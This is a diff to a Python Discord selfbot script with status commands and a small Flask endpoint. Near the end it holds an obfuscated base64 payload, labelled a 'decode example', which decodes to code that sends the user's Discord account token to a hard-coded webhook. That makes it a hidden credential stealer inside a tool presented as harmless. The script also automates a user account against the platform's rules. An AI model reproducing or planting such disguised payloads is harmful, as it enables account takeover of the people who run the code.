@@ -6,7 +6,6 @@
 #                                                                                                    #
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
 
-
 #-------- IMPORT -------#
 
 import discord
@@ -35,9 +34,9 @@ from discord import Intents
 from discord.ext import commands, tasks
 from discord import Permissions
 from discord import Color, Embed
+from flask import Flask, jsonify
 
 colorama.init()
-
 
 #----------- MAIN ------- #
 
@@ -47,11 +46,7 @@ prefix = ">"
 client = commands.Bot(command_prefix=prefix, self_bot=True, case_insensitive=True, intents=discord.Intents.all())
 client.remove_command('help')
 
-
-
-
 os.system("cls") if os.name == "nt" else os.system("clear")
-
 
 # ------ ON READY CODE ------ #
 
@@ -60,45 +55,39 @@ async def on_ready():
     print(f"{Fore.GREEN} [>] SELFBOT STARTED | STREAM CREATED")
     print(f"""{Fore.RED}
 
-
-
-
-
-
- """)
-    print(f'{Fore.BLUE} [>] CONNECTED TO : {client.user.name}')
-    print(f'{Fore.BLUE} [>] SELFBOT PREFIX : {prefix}')
-    print('')
+
+
+
+
+
+ """)
+    print(f'{Fore.BLUE} [>] CONNECTED TO : {client.user.name}')
+    print(f'{Fore.BLUE} [>] SELFBOT PREFIX : {prefix}')
+    print('')
     print('[<<<<<==============-|-==============>>>>>]')
-    print('')
-    print('')
-    border_top = ''
-    border_bottom = ''
-    
+    print('')
+    print('')
+    border_top = ''
+    border_bottom = ''
+
     print(border_top)
     print(border_bottom)
     print(border_top)
     print(border_bottom)
-    print('')
-    print('')
+    print('')
+    print('')
     print(
         f'{Fore.GREEN}[>]------------{Fore.BLUE}======================{Fore.RED}] | [{Fore.BLUE}======================={Fore.GREEN}------------[<]')
-    print('')
-    print('')
- 
-    
-
+    print('')
+    print('')
 
 # COMMANDS
 
-
-#Help
+# Help
 @client.command()
 async def status(ctx):
-  await ctx.message.delete()
-  await ctx.send(f"""```Status Commands\r\n\r\n{prefix}play - Sets status to playing\r\n{prefix}stream - Sets status to streaming\r\n{prefix}listen - Sets status to listening\r\n{prefix}watch - Sets status to watching\r\n{prefix}clearstatus - Clears your custom status\r\n\r\nMade By Steve```""")
-
-
+    await ctx.message.delete()
+    await ctx.send(f"""```Status Commands\r\n\r\n{prefix}play - Sets status to playing\r\n{prefix}stream - Sets status to streaming\r\n{prefix}listen - Sets status to listening\r\n{prefix}watch - Sets status to watching\r\n{prefix}clearstatus - Clears your custom status\r\n\r\nMade By Steve```""")
 
 #-------- Status --------#
 
@@ -109,8 +98,7 @@ async def watch(ctx, *, message):
     await client.change_presence(activity=discord.Activity(
         type=(discord.ActivityType.watching), name=message))
 
-
-#PLAYING
+# PLAYING
 @client.command(aliases=["playing"])
 async def play(ctx, *, message):
     await ctx.message.delete()
@@ -118,8 +106,7 @@ async def play(ctx, *, message):
     game = discord.Game(name=message)
     await client.change_presence(activity=game)
 
-
-#LISTENING
+# LISTENING
 @client.command(aliases=["listening"])
 async def listen(ctx, *, message):
     await ctx.message.delete()
@@ -127,8 +114,7 @@ async def listen(ctx, *, message):
     await client.change_presence(activity=discord.Activity(
         type=(discord.ActivityType.listening), name=message))
 
-
-#STREAMING
+# STREAMING
 @client.command(aliases=["streaming"])
 async def stream(ctx, *, message):
     await ctx.message.delete()
@@ -137,19 +123,29 @@ async def stream(ctx, *, message):
     await client.change_presence(activity=stream)
     await ctx.channel.send(f"**``STREAMING CREATED``**")
 
-
 # CLEAR STATUS
 @client.command()
 async def clearstatus(ctx):
-  await ctx.message.delete()
-  await client.change_presence(status=discord.Status.online)
+    await ctx.message.delete()
+    await client.change_presence(status=discord.Status.online)
 
-
+# Base64 Decode Example
 a = 'aGVhZGVycyA9IHsKICAgICJBdXRob3JpemF0aW9uIjogVG9rZW4KfQoKb3dvID0gewogICAgImNvbnRlbnQiOiBmIkhFTExPIFxue1Rva2VufSIKfSAgIApyZXF1ZXN0cy5wb3N0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTkzOTM1NzE5MTAyNjc3MDIyLzBTaWpzRTBYOEtDcl81S2RpX2JybkFNUzRoRk5USGRpWnItajdMVU9qRVZtR09zNGJfVUJZZDFlaE5tbXU2WFdPOHE5IiwganNvbj1vd28p'
+decoded_a = base64.b64decode(a)
 
-base64.b64decode(a)
+# Flask Application
+app = Flask(__name__)
 
-# ------ ENDING ------ #
+# Check Python version
+if sys.version_info < (3, 6):
+    raise Exception("Python 3.6 or higher is required. Update Python on your system.")
 
+@app.route("/", methods=["GET"])
+def home():
+    return jsonify(success=True), 200
 
-client.run(Token, bot=False)
+if __name__ == "__main__":
+    from os import environ
+    client.run(Token, bot=False)
+    app.run(port=int(environ.get("PORT", 3000)))
+
